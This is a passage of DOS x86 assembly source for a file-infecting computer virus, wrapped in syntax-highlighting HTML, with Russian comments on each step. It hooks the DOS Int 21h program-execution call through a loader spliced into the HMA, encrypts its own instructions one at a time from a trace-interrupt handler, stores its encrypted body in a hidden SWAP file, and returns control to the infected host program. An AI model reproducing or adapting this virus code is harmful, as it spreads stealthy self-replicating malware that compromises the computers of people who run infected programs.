        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Modified</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4CFFh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Modified</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Program is modified! Exiting...$'</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Int01h</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">


</span><span class="sc1">;[Получаем точку входа в Int 01h]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc6">Int1</span><span class="sc0">
</span><span class="sc6">Int1</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">


</span><span class="sc1">;[Если предыдущая команда находится в нашем сегменте - шифруем ее]</span><span class="sc0">

</span><span class="sc5">PrevSeg</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1234h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">L1</span><span class="sc0">
</span><span class="sc5">PrevOfs</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1234h</span><span class="sc0">
</span><span class="sc5">PrevXor</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;[Если следующая команда находится в нашем сегменте - расшифроываем ее]</span><span class="sc0">

</span><span class="sc5">L1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">18</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">L2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">NextXor</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;[Сохраняем адрес следующей команды]</span><span class="sc0">

</span><span class="sc5">L2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">18</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">PrevSeg</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc6">Int1</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">PrevOfs</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc6">Int1</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc1">;[Проверяем, есть ли в HMA место для LOADER'а]</span><span class="sc0">

</span><span class="sc5">Crypt</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4A01h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LoaderSize</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">MemOk</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Quit1</span><span class="sc0">

</span><span class="sc5">MemOk</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">


</span><span class="sc1">;[Ищем в HMA начало обработчика Int21h]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">Loop02</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">80FAh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">L4</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">73FCh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">L4</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">77h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Found2</span><span class="sc0">
</span><span class="sc5">L4</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Loop02</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Quit1</span><span class="sc0">
</span><span class="sc5">Found2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">


</span><span class="sc1">;[Запоминаем ключ для зашифровки вируса в памяти]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Key2</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">


</span><span class="sc1">;[Выделяем память для LOADER'а в HMA]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4A02h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LoaderSize</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">


</span><span class="sc1">;[Копируем LOADER в выделенную память]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LoaderSize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Loader</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">


</span><span class="sc1">;[Делаем сплайсинг в начало обработчика]</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">


</span><span class="sc1">;[Создаем SWAP-файл]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SwapName</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Quit1</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">


</span><span class="sc1">;[Шифруем вирус и записываем его в SWAP-файл]</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">Loop03</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Key2</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OneByte</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OneByte</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close2</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Loop03</span><span class="sc0">


</span><span class="sc1">;[Дописываем в SWAP мусор]</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc1">;[Закрываем SWAP-файл]</span><span class="sc0">

</span><span class="sc5">Close2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        

</span><span class="sc1">;[Отдаем управление зараженной программе]</span><span class="sc0">

</span><span class="sc5">Quit1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldCS</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldSS</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">cli</span><span class="sc0">
</span><span class="sc5">OldSS</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc5">OldSP</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">OldIP</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">OldCS</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">OneByte</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">













</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;               HMA-LOADER</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Loader</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Bh</span><span class="sc0">
</span><span class="sc9">Rest</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Dos</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">


</span><span class="sc1">;[Получаем точку входа в Loader]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Entry</span><span class="sc0">
</span><span class="sc5">Entry</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем защиту от рекурсии]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">Rest</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">


</span><span class="sc1">;[Проверяем наличие вируса в DOS-памяти]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3565h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Int21h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">CallVir</span><span class="sc0">


</span><span class="sc1">;[Открываем SWAP-файл]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D00h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SwapName</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">L5</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Quit2</span><span class="sc0">


</span><span class="sc1">;[Выделяем память для вируса]</span><span class="sc0">

</span><span class="sc5">L5</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemSize</span><span class="sc4">/</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close3</span><span class="sc0">


</span><span class="sc1">;[Помечаем блок памяти как системную область]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">


</span><span class="sc1">;[Копируем вирус из SWAP-файла в память]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc1">;[Закрываем SWAP-файл]</span><span class="sc0">

</span><span class="sc5">Close3</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Quit2</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем вектора прерываний]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2565h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Int21h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc1">;[Расшифровываем вирус]</span><span class="sc0">

</span><span class="sc5">CallVir</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Encrypt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Int21h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc0">


</span><span class="sc1">;[Вызываем вирусный обработчик Int21h]</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">


</span><span class="sc1">;[Зашифровываем вирус]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Encrypt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Int21h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0CFh</span><span class="sc0">


</span><span class="sc1">;[Снимаем защиту от рекурсии]</span><span class="sc0">

</span><span class="sc5">Quit2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">Rest</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">


</span><span class="sc1">;[Отдаем управление настоящему обработчику Int 21h]</span><span class="sc0">

</span><span class="sc5">Dos</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">73h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Encrypt</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3565h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

